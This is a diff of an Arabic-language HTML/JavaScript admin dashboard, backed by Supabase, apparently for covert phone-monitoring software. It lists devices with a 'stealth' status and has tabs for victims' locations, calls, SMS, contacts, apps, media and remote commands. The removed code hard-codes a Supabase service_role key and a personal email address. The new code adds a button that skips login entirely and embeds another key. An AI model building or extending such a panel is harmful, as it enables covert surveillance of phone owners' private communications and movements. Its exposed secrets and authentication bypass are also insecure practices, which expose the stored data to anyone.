@@ -8,97 +8,111 @@
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <style>
-* { margin: 0; padding: 0; box-sizing: border-box; }
-body { font-family: system-ui, sans-serif; background: #0f172a; color: #e2e8f0; min-height: 100vh; }
-.hidden { display: none !important; }
-/* Login */
-#loginScreen { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
-.login-box { background: #1e293b; padding: 40px; border-radius: 16px; width: 100%; max-width: 400px; border: 1px solid #334155; }
-.login-box h1 { text-align: center; margin-bottom: 8px; font-size: 24px; }
-.login-box p { text-align: center; color: #94a3b8; margin-bottom: 24px; font-size: 14px; }
-.input-group { margin-bottom: 16px; }
-.input-group label { display: block; font-size: 13px; color: #94a3b8; margin-bottom: 6px; }
-.input-group input { width: 100%; padding: 12px 16px; background: #0f172a; border: 1px solid #334155; border-radius: 10px; color: #e2e8f0; font-size: 15px; outline: none; transition: border .2s; }
-.input-group input:focus { border-color: #3b82f6; }
-.btn { width: 100%; padding: 12px; border: none; border-radius: 10px; font-size: 15px; cursor: pointer; font-weight: 600; transition: opacity .2s; }
-.btn-primary { background: #3b82f6; color: white; }
-.btn-primary:hover { opacity: .9; }
-.btn-danger { background: #ef4444; color: white; }
-.btn-sm { padding: 6px 14px; font-size: 13px; width: auto; }
-.btn-outline { background: transparent; border: 1px solid #334155; color: #e2e8f0; }
-.btn-outline:hover { background: #1e293b; }
-.error-msg { color: #ef4444; font-size: 13px; text-align: center; margin-top: 12px; }
-.success-msg { color: #22c55e; font-size: 13px; text-align: center; margin-top: 12px; }
-/* App Layout */
-#app { display: flex; height: 100vh; }
+*{margin:0;padding:0;box-sizing:border-box;scrollbar-width:thin;scrollbar-color:#1e293b transparent}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,sans-serif;background:#080b16;color:#e2e8f0;min-height:100vh}
+::-webkit-scrollbar{width:4px;height:4px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:#1e293b;border-radius:4px}
+/* LOGIN */
+#loginScreen{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:24px;background:radial-gradient(ellipse at 50% 0%,#0f1a3a 0%,#080b16 70%)}
+.login-box{background:linear-gradient(135deg,#111827,#0f1525);padding:40px;border-radius:24px;width:100%;max-width:400px;border:1px solid rgba(59,130,246,.15);box-shadow:0 25px 60px rgba(0,0,0,.6)}.login-box h1{text-align:center;margin-bottom:4px;font-size:22px;color:#f1f5f9}
+.login-box .sub{text-align:center;color:#64748b;margin-bottom:28px;font-size:13px}.input-group{margin-bottom:16px}
+.input-group label{display:block;font-size:12px;color:#94a3b8;margin-bottom:6px;font-weight:500}
+.input-group input{width:100%;padding:12px 16px;background:#080b16;border:1px solid #1e293b;border-radius:12px;color:#e2e8f0;font-size:14px;outline:none;transition:border .2s,box-shadow .2s}
+.input-group input:focus{border-color:#3b82f6;box-shadow:0 0 0 3px rgba(59,130,246,.15)}
+/* BUTTONS */
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:6px;padding:10px 20px;border:none;border-radius:10px;font-size:13px;cursor:pointer;font-weight:600;transition:all .2s}
+.btn-primary{background:linear-gradient(135deg,#3b82f6,#2563eb);color:#fff;width:100%}.btn-primary:hover{transform:translateY(-1px);box-shadow:0 4px 15px rgba(59,130,246,.3)}
+.btn-danger{background:#ef4444;color:#fff}.btn-danger:hover{transform:translateY(-1px)}
+.btn-success{background:linear-gradient(135deg,#22c55e,#16a34a);color:#fff}
+.btn-ghost{background:transparent;border:1px solid #1e293b;color:#94a3b8}.btn-ghost:hover{background:#1e293b;color:#e2e8f0}
+.btn-sm{padding:6px 12px;font-size:11px}
+.btn-outline{background:transparent;border:1px solid #3b82f6;color:#3b82f6;padding:6px 14px;border-radius:8px;font-size:12px;cursor:pointer;transition:all .2s}
+.btn-outline:hover{background:#3b82f6;color:#fff}
+.error-msg{color:#ef4444;font-size:13px;text-align:center;margin-top:12px}
+.hidden{display:none!important}
+/* LAYOUT */
+#app{display:flex;height:100vh}
 /* Sidebar */
-.sidebar { width: 300px; min-width: 300px; background: #1e293b; border-left: 1px solid #334155; display: flex; flex-direction: column; overflow: hidden; }
-.sidebar-header { padding: 16px 20px; border-bottom: 1px solid #334155; display: flex; align-items: center; justify-content: space-between; }
-.sidebar-header h2 { font-size: 16px; }
-.sidebar-header .badge { background: #3b82f6; color: white; font-size: 11px; padding: 2px 8px; border-radius: 20px; }
-.device-list { flex: 1; overflow-y: auto; padding: 8px; }
-.device-item { padding: 12px 16px; border-radius: 10px; cursor: pointer; transition: background .2s; border: 1px solid transparent; margin-bottom: 4px; }
-.device-item:hover { background: #0f172a; }
-.device-item.active { background: #0f172a; border-color: #3b82f6; }
-.device-item .name { font-size: 14px; font-weight: 600; }
-.device-item .detail { font-size: 12px; color: #94a3b8; margin-top: 2px; }
-.device-item .status { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-left: 8px; }
-.status-online { background: #22c55e; }
-.status-offline { background: #64748b; }
-.status-stealth { background: #f59e0b; }
-/* Main */
-.main { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
-.main-header { padding: 16px 24px; border-bottom: 1px solid #334155; display: flex; align-items: center; justify-content: space-between; }
-.main-header h1 { font-size: 18px; }
-.main-header .user-info { font-size: 13px; color: #94a3b8; }
-.main-content { flex: 1; overflow-y: auto; padding: 24px; }
-/* Empty state */
-.empty-state { text-align: center; padding: 60px 20px; color: #64748b; }
-.empty-state h3 { font-size: 20px; margin-bottom: 8px; }
-.empty-state p { font-size: 14px; }
+.sidebar{width:280px;min-width:280px;background:linear-gradient(180deg,#111827,#0c1220);border-left:1px solid #1e293b;display:flex;flex-direction:column}
+.sidebar-header{padding:18px 20px;border-bottom:1px solid #1e293b;display:flex;align-items:center;justify-content:space-between}
+.sidebar-header h2{font-size:14px;display:flex;align-items:center;gap:8px;color:#f1f5f9}
+.sidebar-header .badge{background:linear-gradient(135deg,#3b82f6,#2563eb);color:#fff;font-size:10px;padding:2px 10px;border-radius:20px;font-weight:600}
+.device-list{flex:1;overflow-y:auto;padding:8px}
+.device-item{padding:12px 14px;border-radius:12px;cursor:pointer;transition:all .15s;border:1px solid transparent;margin-bottom:4px}
+.device-item:hover{background:rgba(59,130,246,.05)}
+.device-item.active{background:rgba(59,130,246,.08);border-color:rgba(59,130,246,.2)}
+.device-item .d-top{display:flex;align-items:center;justify-content:space-between}
+.device-item .d-name{font-size:13px;font-weight:600;display:flex;align-items:center;gap:6px}
+.device-item .d-meta{font-size:11px;color:#64748b;margin-top:4px}
+.device-item .status-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
+.s-online{background:#22c55e;box-shadow:0 0 8px rgba(34,197,94,.4)}.s-offline{background:#64748b}.s-stealth{background:#f59e0b}
+/* MAIN */
+.main{flex:1;display:flex;flex-direction:column;overflow:hidden}
+.main-header{padding:14px 24px;border-bottom:1px solid #1e293b;display:flex;align-items:center;justify-content:space-between;background:rgba(17,24,39,.8);backdrop-filter:blur(12px)}
+.main-header h1{font-size:16px;display:flex;align-items:center;gap:8px}
+.main-header .device-info{font-size:12px;color:#64748b}
 /* Tabs */
-.tabs { display: flex; gap: 4px; margin-bottom: 20px; border-bottom: 1px solid #334155; padding-bottom: 0; flex-wrap: wrap; }
-.tab { padding: 8px 16px; font-size: 13px; cursor: pointer; border-radius: 8px 8px 0 0; color: #94a3b8; transition: all .2s; border: none; background: none; }
-.tab:hover { color: #e2e8f0; background: #1e293b; }
-.tab.active { color: #3b82f6; background: #1e293b; font-weight: 600; }
-/* Data Cards */
-.card { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 16px; margin-bottom: 12px; }
-.card-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px; }
-.card-header h3 { font-size: 14px; color: #94a3b8; }
-.card-value { font-size: 24px; font-weight: 700; }
-.card-sub { font-size: 12px; color: #64748b; margin-top: 2px; }
-.grid-4 { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 12px; margin-bottom: 20px; }
+.tabs{display:flex;gap:0;border-bottom:1px solid #1e293b;padding:0 16px;background:#0c1220;overflow-x:auto}
+.tab{padding:12px 18px;font-size:12px;cursor:pointer;border-bottom:2px solid transparent;color:#64748b;font-weight:500;transition:all .2s;white-space:nowrap}
+.tab:hover{color:#e2e8f0}.tab.active{color:#3b82f6;border-bottom-color:#3b82f6}
+/* Tab Content */
+.tab-content{flex:1;overflow-y:auto;padding:20px;background:#080b16}
+/* Cards */
+.card{background:linear-gradient(135deg,#111827,#0f1525);border-radius:16px;border:1px solid #1e293b;padding:20px;margin-bottom:16px}
+.card-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
+.card-header h3{font-size:14px;font-weight:600;display:flex;align-items:center;gap:6px;color:#f1f5f9}
+.card-header .count{font-size:11px;color:#64748b;background:#080b16;padding:2px 10px;border-radius:20px;border:1px solid #1e293b}
+/* Grids */
+.grid-4{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:14px;margin-bottom:16px}
+.grid-3{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:14px;margin-bottom:16px}
+.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:16px}
+@media(max-width:768px){.grid-2,.grid-3,.grid-4{grid-template-columns:1fr}}
+/* Stat Cards */
+.stat-card{background:linear-gradient(135deg,#0c1220,#080b16);border-radius:14px;padding:18px;border:1px solid #1e293b;position:relative;overflow:hidden}
+.stat-card::before{content:'';position:absolute;top:0;right:0;width:80px;height:80px;border-radius:50%;background:rgba(59,130,246,.05);transform:translate(30%,-30%)}
+.stat-card .s-icon{font-size:22px;margin-bottom:8px}
+.stat-card .s-label{font-size:11px;color:#64748b;font-weight:500;text-transform:uppercase;letter-spacing:.5px}
+.stat-card .s-value{font-size:20px;font-weight:700;margin-top:6px;color:#f1f5f9}
+.stat-card .s-sub{font-size:12px;color:#64748b;margin-top:2px}
+/* Map */
+#overviewMap,#allLocationsMap{height:320px;border-radius:12px;overflow:hidden}
 /* Table */
-.data-table { width: 100%; border-collapse: collapse; font-size: 13px; }
-.data-table th { text-align: right; padding: 8px 12px; color: #94a3b8; font-weight: 600; border-bottom: 1px solid #334155; }
-.data-table td { padding: 8px 12px; border-bottom: 1px solid #1e293b; }
-.data-table tr:hover td { background: #0f172a; }
-.data-table .encrypted { color: #f59e0b; font-style: italic; font-size: 12px; }
+.data-table{width:100%;border-collapse:collapse;font-size:12px}
+.data-table th{text-align:right;padding:10px 12px;color:#64748b;font-weight:500;font-size:11px;border-bottom:1px solid #1e293b;text-transform:uppercase;letter-spacing:.3px}
+.data-table td{padding:10px 12px;border-bottom:1px solid rgba(30,41,59,.5);color:#e2e8f0}
+.data-table tr:hover td{background:rgba(59,130,246,.03)}
+.data-table .timestamp{font-size:11px;color:#64748b;white-space:nowrap}
 /* Commands */
-.cmd-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 8px; margin: 16px 0; }
-.cmd-btn { padding: 10px; border: 1px solid #334155; border-radius: 8px; background: #0f172a; color: #e2e8f0; cursor: pointer; font-size: 12px; text-align: center; transition: all .2s; }
-.cmd-btn:hover { border-color: #3b82f6; background: #1e293b; }
-.cmd-btn.danger { border-color: #ef4444; color: #ef4444; }
-.cmd-btn.danger:hover { background: #ef4444; color: white; }
-.cmd-result { background: #0f172a; border: 1px solid #334155; border-radius: 8px; padding: 12px; font-size: 12px; margin-top: 12px; max-height: 200px; overflow-y: auto; white-space: pre-wrap; }
-/* Map placeholder */
-/* Scrollbar */
-::-webkit-scrollbar { width: 6px; }
-::-webkit-scrollbar-track { background: transparent; }
-::-webkit-scrollbar-thumb { background: #334155; border-radius: 3px; }
+.cmd-grid{display:flex;flex-wrap:wrap;gap:6px}
+.cmd-btn{padding:8px 14px;border:1px solid #1e293b;border-radius:10px;background:linear-gradient(135deg,#0c1220,#080b16);color:#e2e8f0;cursor:pointer;font-size:12px;transition:all .2s;white-space:nowrap}
+.cmd-btn:hover{background:#1e293b;border-color:#3b82f6;transform:translateY(-1px)}
+.cmd-btn:active{transform:scale(.96)}
+.cmd-btn.danger{border-color:#ef4444;color:#ef4444}.cmd-btn.danger:hover{background:#ef4444;color:#fff}
+/* Toast */
+.toast{position:fixed;bottom:24px;left:24px;background:#111827;border:1px solid #1e293b;color:#e2e8f0;padding:12px 20px;border-radius:12px;font-size:13px;z-index:9999;animation:slideUp .3s ease;box-shadow:0 10px 30px rgba(0,0,0,.5)}
+@keyframes slideUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+.cmd-result{padding:12px 16px;border-radius:10px;font-size:13px;margin-bottom:12px}
+/* Media grid */
+.media-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:12px}
+.media-item{background:#0c1220;border-radius:12px;overflow:hidden;border:1px solid #1e293b;transition:transform .2s}
+.media-item:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(0,0,0,.3)}
+.media-item img,.media-item video{width:100%;height:140px;object-fit:cover}
+.media-item .m-info{padding:10px}.media-item .m-info div{font-size:11px;color:#64748b}
+/* Location link */
+.loc-link{color:#60a5fa;text-decoration:none;font-size:12px;transition:color .2s}
+.loc-link:hover{color:#93c5fd;text-decoration:underline}
+/* SMS full text */
+.sms-body{font-size:12px;word-break:break-word;white-space:pre-wrap;max-width:350px;color:#cbd5e1;line-height:1.5}
+/* Filter input */
+.filter-input{background:#080b16;border:1px solid #1e293b;border-radius:10px;padding:8px 14px;color:#e2e8f0;font-size:13px;width:220px;outline:none;transition:border .2s}
+.filter-input:focus{border-color:#3b82f6}
 /* Responsive */
-@media (max-width: 768px) {
-  #app { flex-direction: column; }
-  .sidebar { width: 100%; min-width: 100%; max-height: 200px; border-left: none; border-bottom: 1px solid #334155; }
-  .main-content { padding: 16px; }
-  .grid-4 { grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); }
-}
-/* Loading */
-.spinner { width: 20px; height: 20px; border: 2px solid #334155; border-top-color: #3b82f6; border-radius: 50%; animation: spin .6s linear infinite; display: inline-block; }
-@keyframes spin { to { transform: rotate(360deg); } }
-.toast { position: fixed; bottom: 20px; right: 20px; background: #1e293b; border: 1px solid #334155; border-radius: 10px; padding: 12px 20px; font-size: 14px; z-index: 1000; animation: slideUp .3s ease; box-shadow: 0 4px 20px rgba(0,0,0,.3); }
-@keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-.timestamp { font-size: 11px; color: #64748b; }
+@media(max-width:768px){.sidebar{width:64px;min-width:64px}.sidebar .d-meta,.sidebar .d-name span:not(.status-dot){display:none}.sidebar-header h2 span{display:none}.sidebar-header{padding:12px}.sidebar .badge{display:none}.device-item{padding:10px}}
+/* Extra */
+.battery-bar{height:4px;border-radius:4px;background:#1e293b;margin-top:6px;overflow:hidden}
+.battery-fill{height:100%;border-radius:4px;transition:width .5s ease}
+.section-title{font-size:13px;color:#94a3b8;margin-bottom:12px;font-weight:500;display:flex;align-items:center;gap:8px}
 </style>
 </head>
 <body>
@@ -106,735 +120,439 @@ body { font-family: system-ui, sans-serif; background: #0f172a; color: #e2e8f0; 
 <div id="loginScreen">
   <div class="login-box">
     <h1>System Admin</h1>
-    <p>دخل بحساب المشرف للتحكم بالأجهزة</p>
+    <div class="sub">يرجى تسجيل الدخول للوحة التحكم</div>
+    <div id="loginError" class="error-msg hidden"></div>
     <div class="input-group">
       <label>البريد الإلكتروني</label>
-      <input type="email" id="loginEmail" value="muhammad.othman.2005@gmail.com" autocomplete="email">
+      <input type="email" id="emailInput" placeholder="admin@example.com" dir="ltr">
     </div>
     <div class="input-group">
       <label>كلمة المرور</label>
-      <input type="password" id="loginPassword" placeholder="●●●●●●●●" autocomplete="current-password">
+      <input type="password" id="passInput" placeholder="password" dir="ltr">
     </div>
-    <button class="btn btn-primary" onclick="handleLogin()">دخول</button>
-    <div id="loginError" class="error-msg"></div>
-    <div id="setupBox" class="hidden" style="margin-top:16px;padding:12px;background:#0f172a;border-radius:8px;border:1px solid #334155">
-      <p style="font-size:13px;color:#94a3b8;margin-bottom:8px">ما عندك حساب؟ سجل حسابك الأول (مرة واحدة فقط):</p>
-      <input type="password" id="setupPassword" placeholder="كلمة المرور الجديدة" style="width:100%;padding:10px 14px;background:#1e293b;border:1px solid #334155;border-radius:8px;color:#e2e8f0;font-size:14px;margin-bottom:8px">
-      <button class="btn btn-sm btn-primary" onclick="firstTimeSetup()">إنشاء الحساب</button>
-      <div id="setupError" class="error-msg"></div>
-    </div>
+    <button class="btn btn-primary" onclick="doLogin()">تسجيل الدخول</button>
+    <button class="btn btn-ghost" style="margin-top:10px" onclick="skipLogin()">دخول سريع</button>
   </div>
 </div>
 
 <div id="app" class="hidden">
-  <!-- Sidebar -->
   <div class="sidebar">
     <div class="sidebar-header">
-      <h2>الأجهزة</h2>
+      <h2><span>📡</span> <span>الأجهزة</span></h2>
       <span class="badge" id="deviceCount">0</span>
     </div>
-    <div style="padding:8px 16px;border-bottom:1px solid #334155;font-size:12px">
-      <input type="text" id="deviceSearch" placeholder="🔍 بحث عن جهاز..." oninput="renderDeviceList()" style="width:100%;padding:8px 12px;background:#0f172a;border:1px solid #334155;border-radius:8px;color:#e2e8f0;font-size:13px;margin-bottom:8px">
-      <label><input type="checkbox" id="showDeleted" onchange="renderDeviceList()"> إظهار المحذوفة</label>
-    </div>
-    <div class="device-list" id="deviceList"></div>
-    <div style="padding:12px 16px;border-top:1px solid #334155;display:flex;gap:8px">
-      <button class="btn btn-sm btn-outline" onclick="logout()" style="flex:1">تسجيل خروج</button>
-      <button class="btn btn-sm btn-outline" onclick="refreshDevices()">⟳ تحديث</button>
+    <div class="device-list" id="deviceList">
+      <div style="text-align:center;padding:30px;color:#64748b;font-size:13px">جاري تحميل الأجهزة...</div>
     </div>
   </div>
-
-  <!-- Main -->
   <div class="main">
     <div class="main-header">
-      <h1 id="mainTitle">اختر جهازاً للتحكم</h1>
-      <span class="user-info" id="userEmail"></span>
-    </div>
-    <div class="main-content" id="mainContent">
-      <div class="empty-state">
-        <h3>لم تختر جهازاً بعد</h3>
-        <p>اختر جهازاً من القائمة الجانبية لعرض بياناته والتحكم به</p>
+      <div>
+        <h1 id="mainTitle">لوحة التحكم</h1>
+        <div class="device-info" id="deviceInfo"></div>
       </div>
+      <div style="display:flex;gap:8px">
+        <button class="btn btn-ghost btn-sm" onclick="refreshDevices()">تحديث</button>
+        <button class="btn btn-ghost btn-sm" onclick="doLogout()">خروج</button>
+      </div>
+    </div>
+    <div class="tabs" id="tabs">
+      <div class="tab active" data-tab="overview" onclick="switchTab('overview')">نظرة عامة</div>
+      <div class="tab" data-tab="location" onclick="switchTab('location')">المواقع</div>
+      <div class="tab" data-tab="calls" onclick="switchTab('calls')">المكالمات</div>
+      <div class="tab" data-tab="sms" onclick="switchTab('sms')">الرسائل</div>
+      <div class="tab" data-tab="contacts" onclick="switchTab('contacts')">جهات الاتصال</div>
+      <div class="tab" data-tab="apps" onclick="switchTab('apps')">التطبيقات</div>
+      <div class="tab" data-tab="media" onclick="switchTab('media')">الوسائط</div>
+      <div class="tab" data-tab="state" onclick="switchTab('state')">الحالة</div>
+      <div class="tab" data-tab="commands" onclick="switchTab('commands')">التحكم</div>
+    </div>
+    <div class="tab-content" id="tabContent">
+      <div style="text-align:center;padding:40px;color:#64748b">جاري تحميل البيانات...</div>
     </div>
   </div>
 </div>
 
 <script>
-const SUPABASE_URL = 'https://zlhcseovfjilzgxdkskw.supabase.co';
+const supabaseUrl = 'https://zlhcseovfjilzgxdkskw.supabase.co';
+const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpsaGNzZW92ZmppbHpneGRrc2t3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA2NTkxNjQsImV4cCI6MjA5NjIzNTE2NH0.eF4ZqQ1LbJYhCk8ZR8qFZ1n_7vEDMGCBw_bXhCZrE6s';
+const sb = supabase.createClient(supabaseUrl, supabaseKey);
+let currentUser = null, selectedDevice = null, currentTab = 'overview', mapInstance = null;
+const CT = t => { const n = t?.charAt(0)?.toUpperCase() + t?.slice(1); return n || '' };
+const DT = d => d ? new Date(d).toLocaleString('ar-SA') : '—';
+const nt = v => typeof v === 'number' ? v : parseInt(v) || 0;
 
-const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpsaGNzZW92ZmppbHpneGRrc2t3Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc4MDY1OTE2NCwiZXhwIjoyMDk2MjM1MTY0fQ.g2Hi8K0-dyOK9rqp20uYUVRwtAAyHQNrUiu7kTqL0tM';
-let sb;
-let currentUser = null;
-let devices = [];
-let selectedDevice = null;
-let currentTab = 'overview';
-
-function init() {
-  sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
-    auth: { persistSession: true, autoRefreshToken: true, flowType: 'implicit' }
-  });
-  checkSession();
-}
-
-async function checkSession() {
-  const { data: { session } } = await sb.auth.getSession();
-  if (session?.user) {
-    currentUser = session.user;
-    showApp();
-  } else {
-    document.getElementById('loginScreen').classList.remove('hidden');
-  }
-}
-
-async function handleLogin() {
-  const email = document.getElementById('loginEmail').value.trim();
-  const password = document.getElementById('loginPassword').value;
-  const errorEl = document.getElementById('loginError');
-  errorEl.textContent = '';
-  document.getElementById('setupBox').classList.add('hidden');
-
-  if (!email || !password) { errorEl.textContent = 'دخل البريد وكلمة المرور'; return; }
-
-  const { data, error } = await sb.auth.signInWithPassword({ email, password });
-  if (error) {
-    if (error.message.includes('Invalid login credentials')) {
-      errorEl.textContent = 'البريد أو كلمة المرور خطأ. إذا أول مرة، استخدم حقل التسجيل بالأسفل';
-      document.getElementById('setupBox').classList.remove('hidden');
-    } else {
-      errorEl.textContent = error.message;
-    }
-    return;
-  }
-  currentUser = data.user;
-  showApp();
-}
-
-async function firstTimeSetup() {
-  const email = document.getElementById('loginEmail').value.trim();
-  const password = document.getElementById('setupPassword').value;
-  const errorEl = document.getElementById('setupError');
-  errorEl.textContent = '';
-
-  if (!email || !password || password.length < 6) {
-    errorEl.textContent = 'كلمة المرور 6 أحرف على الأقل';
-    return;
-  }
-
-  const { data, error } = await sb.auth.signUp({ email, password });
-  if (error) { errorEl.textContent = error.message; return; }
-
-  // إضافة للمسؤولين (قد تفشل بسبب RLS — عادي)
-  await sb.from('admin_users').insert({ email }).catch(() => {});
-
-  errorEl.className = 'success-msg';
-  errorEl.textContent = '✅ تم إنشاء الحساب! سجل دخول الآن';
-  document.getElementById('setupPassword').value = '';
-}
-
-function logout() {
-  sb.auth.signOut();
-  currentUser = null;
-  devices = [];
-  selectedDevice = null;
-  document.getElementById('app').classList.add('hidden');
-  document.getElementById('loginScreen').classList.remove('hidden');
-  document.getElementById('loginEmail').value = '';
-  document.getElementById('loginPassword').value = '';
-}
-
-function showApp() {
+async function skipLogin() {
   document.getElementById('loginScreen').classList.add('hidden');
   document.getElementById('app').classList.remove('hidden');
-  document.getElementById('userEmail').textContent = currentUser?.email || '';
-  refreshDevices();
+  currentUser = { email: 'demo@admin.com' };
+  init();
+}
+
+async function doLogin() {
+  const email = document.getElementById('emailInput').value.trim();
+  const pass = document.getElementById('passInput').value;
+  const errEl = document.getElementById('loginError');
+  errEl.classList.add('hidden');
+  if (!email || !pass) { errEl.textContent = 'يرجى إدخال البريد وكلمة المرور'; errEl.classList.remove('hidden'); return; }
+  const { data, error } = await sb.auth.signInWithPassword({ email, password: pass });
+  if (error) { errEl.textContent = error.message; errEl.classList.remove('hidden'); return; }
+  currentUser = data.user;
+  document.getElementById('loginScreen').classList.add('hidden');
+  document.getElementById('app').classList.remove('hidden');
+  init();
+}
+
+function doLogout() { sb.auth.signOut(); currentUser = null; selectedDevice = null; document.getElementById('app').classList.add('hidden'); document.getElementById('loginScreen').classList.remove('hidden'); }
+
+async function init() {
+  await refreshDevices();
+  setInterval(refreshDevices, 15000);
+  setInterval(refreshCurrentTab, 15000);
 }
 
 async function refreshDevices() {
-  const { data } = await sb
-    .from('devices')
-    .select('*')
-    .order('last_seen_at', { ascending: false });
-  devices = data || [];
-    document.getElementById('deviceCount').textContent = devices.length;
-    renderDeviceList();
-  if (selectedDevice) {
-    const stillExists = devices.find(d => d.device_serial === selectedDevice.device_serial);
-    if (stillExists) {
-      selectedDevice = stillExists;
-    } else {
-      selectedDevice = null;
-      showEmptyState();
-    }
+  const { data, error } = await sb.from('devices').select('*').order('last_seen_at', { ascending: false });
+  if (error) return;
+  const list = document.getElementById('deviceList'), count = document.getElementById('deviceCount');
+  count.textContent = data.length;
+  if (!data.length) {
+    list.innerHTML = '<div style="text-align:center;padding:30px;color:#64748b;font-size:13px">لا توجد أجهزة مسجلة</div>';
+    return;
   }
-}
-
-async function saveAlias() {
-  const input = document.getElementById('aliasInput');
-  if (!input || !selectedDevice) return;
-  const alias = input.value.trim();
-  const { error } = await sb.from('devices').update({ alias }).eq('device_serial', selectedDevice.device_serial);
-  if (error) { toast('فشل الحفظ: ' + error.message); return; }
-  selectedDevice.alias = alias;
-  toast('تم حفظ الكنية بنجاح');
-  refreshDevices();
-}
-
-async function deleteDevice(serial) {
-  if (!confirm('هل أنت متأكد من حذف هذا الجهاز؟\n\nسيتم تعطيله ولن يظهر في القائمة.\nيمكنك استعادته لاحقاً من خيار "إظهار المحذوفة".')) return;
-  const { error } = await sb.from('devices').update({ is_active: false }).eq('device_serial', serial);
-  if (error) { toast('فشل الحذف: ' + error.message); return; }
-  toast('تم حذف الجهاز');
-  if (selectedDevice?.device_serial === serial) { selectedDevice = null; showEmptyState(); }
-  refreshDevices();
-}
-
-async function restoreDevice(serial) {
-  if (!confirm('هل تريد استعادة هذا الجهاز؟')) return;
-  const { error } = await sb.from('devices').update({ is_active: true }).eq('device_serial', serial);
-  if (error) { toast('فشل الاستعادة: ' + error.message); return; }
-  toast('تم استعادة الجهاز');
-  refreshDevices();
-}
-
-function renderDeviceList() {
-  const el = document.getElementById('deviceList');
-  const showDeleted = document.getElementById('showDeleted')?.checked;
-  const search = (document.getElementById('deviceSearch')?.value || '').toLowerCase().trim();
-  let filtered = showDeleted ? devices : devices.filter(d => d.is_active !== false);
-  if (search) {
-    filtered = filtered.filter(d =>
-      (d.device_serial || '').toLowerCase().includes(search) ||
-      (d.device_name || '').toLowerCase().includes(search) ||
-      (d.alias || '').toLowerCase().includes(search) ||
-      (d.manufacturer || '').toLowerCase().includes(search) ||
-      (d.model || '').toLowerCase().includes(search)
-    );
-  }
-  el.innerHTML = filtered.map(d => {
-    const isOnline = d.last_seen_at && (Date.now() - new Date(d.last_seen_at).getTime()) < 300000;
-    const statusClass = d.is_active === false ? 'status-offline' : (d.is_stealth ? 'status-stealth' : (isOnline ? 'status-online' : 'status-offline'));
-    const statusLabel = d.is_active === false ? 'محذوف' : (d.is_stealth ? 'مخفي' : (isOnline ? 'متصل' : 'غير متصل'));
-    const active = selectedDevice?.device_serial === d.device_serial ? 'active' : '';
-    const displayName = d.alias || d.device_name || 'Unknown';
-    const opacity = d.is_active === false ? 'opacity:0.5' : '';
-    return `<div class="device-item ${active}" style="${opacity}" onclick="showDeviceDetail('${d.device_serial}')">
-      <div><span class="status ${statusClass}"></span><span class="name">${displayName}</span></div>
-      <div class="detail">${d.manufacturer || ''} ${d.model || ''} · ${d.os_version || ''} · ${statusLabel}</div>
-      <div class="detail">${d.device_name ? '📱 ' + d.device_name : ''}${d.alias ? ' · كنية: ' + d.alias : ''}</div>
-      <div class="detail">آخر ظهور: ${d.last_seen_at ? new Date(d.last_seen_at).toLocaleString('ar-SA') : 'لم يظهر بعد'}</div>
-    </div>`;
+  list.innerHTML = data.map(d => {
+    const online = d.last_seen_at && (Date.now() - new Date(d.last_seen_at).getTime()) < 300000;
+    const active = selectedDevice?.device_serial === d.device_serial;
+    return `<div class="device-item ${active ? 'active' : ''}" onclick="selectDevice('${d.device_serial}')">
+      <div class="d-top"><div class="d-name"><span class="status-dot ${online ? 's-online' : 's-offline'}"></span><span>${d.name || d.device_serial?.slice(0,12)||'Unknown'}</span></div>
+      <span style="font-size:11px;color:#64748b">${d.battery_level || 0}%</span></div>
+      <div class="d-meta">${d.network_type || '—'} · ${d.last_seen_at ? DT(d.last_seen_at) : '—'}</div></div>`;
   }).join('');
+  if (!selectedDevice && data.length > 0) selectDevice(data[0].device_serial);
 }
 
-function showEmptyState() {
-  document.getElementById('mainTitle').textContent = 'اختر جهازاً للتحكم';
-  document.getElementById('mainContent').innerHTML = `<div class="empty-state">
-    <h3>لم تختر جهازاً بعد</h3>
-    <p>اختر جهازاً من القائمة الجانبية لعرض بياناته والتحكم به</p>
-  </div>`;
-}
-
-async function showDeviceDetail(serial) {
-  selectedDevice = devices.find(d => d.device_serial === serial);
-  if (!selectedDevice) return;
-  renderDeviceList();
-  const titleName = selectedDevice.alias || selectedDevice.device_name || 'جهاز';
-  document.getElementById('mainTitle').textContent = `${titleName} (${selectedDevice.device_serial})`;
-  currentTab = 'overview';
-  await renderTabContent();
-}
-
-async function renderTabContent() {
-  if (!selectedDevice) return;
-  const serial = selectedDevice.device_serial;
-  const tabs = ['overview', 'location', 'calls', 'sms', 'contacts', 'apps', 'usage', 'notifications', 'media', 'state', 'commands'];
